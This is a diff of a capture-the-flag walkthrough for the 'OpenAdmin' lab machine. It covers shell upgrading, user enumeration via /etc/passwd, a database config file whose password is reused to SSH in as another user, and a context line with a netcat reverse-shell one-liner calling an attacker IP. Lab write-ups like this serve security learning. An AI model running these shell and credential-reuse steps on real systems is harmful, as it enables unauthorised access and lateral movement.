@@ -75,9 +75,45 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f
 ```
 
 Once I've caught another shell, I upgrade it once again using python.
-```
+```py
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 ### Lateral Movement
+
+I look into what other users are on the box by looking into`/etc/passwd`and find two users: jimmy and joanna.
+```
+www-data@openadmin:/opt/ona/www/config$ cat /etc/passwd | grep home
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+```
+
+After some enumeration in the directory`/var/www/html`I find an intersting file named`database_settings.inc.php` which contain credentials.
+```php
+<?php
+
+$ona_contexts=array (
+  'DEFAULT' => 
+  array (
+    'databases' => 
+    array (
+      0 => 
+      array (
+        'db_type' => 'mysqli',
+        'db_host' => 'localhost',
+        'db_login' => 'ona_sys',
+        'db_passwd' => 'n1nj4W4rri0R!',
+        'db_database' => 'ona_default',
+        'db_debug' => false,
+      ),
+    ),
+    'description' => 'Default data context',
+    'context_color' => '#D3DBFF',
+  ),
+);
+```
+
+I can use the password`n1nj4W4rri0R!`on user`jimmy`to SSH into the box.
+![image]({{0xtaylur.github.io}}/assets/openadmin/jimssh.png)
 
